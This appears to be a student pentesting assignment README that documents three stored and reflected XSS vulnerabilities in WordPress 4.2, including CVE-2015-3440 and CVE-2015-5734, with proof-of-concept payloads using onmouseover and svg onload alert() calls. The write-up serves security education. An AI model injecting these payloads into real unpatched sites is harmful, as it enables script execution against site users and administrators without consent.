# Project 7 - WordPress Pentesting

Time spent: **2.5** hours spent in total

> Objective: Find, analyze, recreate, and document **three vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) CVE-2015-3440
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: https://github.com/satyamsharma/codepath-web-security-week-7/blob/master/XSS_1.gif
  - [ ] Steps to recreate: Enter the following in the Reply:
  
<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
       
  - [ ] Affected source code:
    - [Link 1](https://www.exploit-db.com/exploits/36844/)
    
    
    
2. (Required) Vulnerability Name or ID
  - [ ] Summary: XSS (Authenticated Cross-Site Scripting)
    - Vulnerability types:XSS
    - Tested in version:4.2
    - Fixed in version: 4.2.6
  - [ ] GIF Walkthrough: https://github.com/satyamsharma/codepath-web-security-week-7/blob/master/XSS_2.gif
  - [ ] Steps to recreate: Enter the following in the Reply:
  
  http://www.test.com/wp-admin/customize.php?theme=<svg onload=alert(2)>
  
  - [ ] Affected source code:
    - [Link 2](https://github.com/WordPress/WordPress/blob/master/wp-admin/customize.php)
    
    
    
   
3. (Required) Vulnerability Name or ID
  - [ ] Summary: CVE-2015-5734
    - Vulnerability types: XSS
    - Tested in version:4.2
    - Fixed in version: 4.2.4
  - [ ] GIF Walkthrough: https://github.com/satyamsharma/codepath-web-security-week-7/blob/master/XSS_3.gif
  - [ ] Steps to recreate: Enter and submit the following in the Reply:
  
  <a href='/wp-admin/' title="" style="position:absolute;top:0;width:10%;height:100%;display:block;" onmouseover=alert(1)//'>TEST</a>
  
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)


## Assets

List any additional assets, such as scripts or files
https://github.com/satyamsharma/codepath-web-security-week-7/blob/master/XSS_1.gif
https://github.com/satyamsharma/codepath-web-security-week-7/blob/master/XSS_2.gif
https://github.com/satyamsharma/codepath-web-security-week-7/blob/master/XSS_3.gif

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
